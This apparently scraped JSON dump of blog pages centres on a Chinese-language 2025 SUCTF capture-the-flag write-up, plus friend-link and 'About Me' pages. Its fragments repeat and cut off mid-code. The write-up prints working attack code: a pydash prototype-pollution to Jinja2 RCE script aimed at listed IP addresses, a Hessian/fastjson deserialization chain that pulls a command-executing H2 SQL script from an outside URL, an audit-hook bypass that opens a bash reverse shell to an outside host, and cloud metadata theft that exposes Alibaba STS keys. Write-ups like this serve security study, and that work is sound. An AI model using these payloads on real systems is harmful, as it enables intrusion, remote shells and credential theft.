new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p 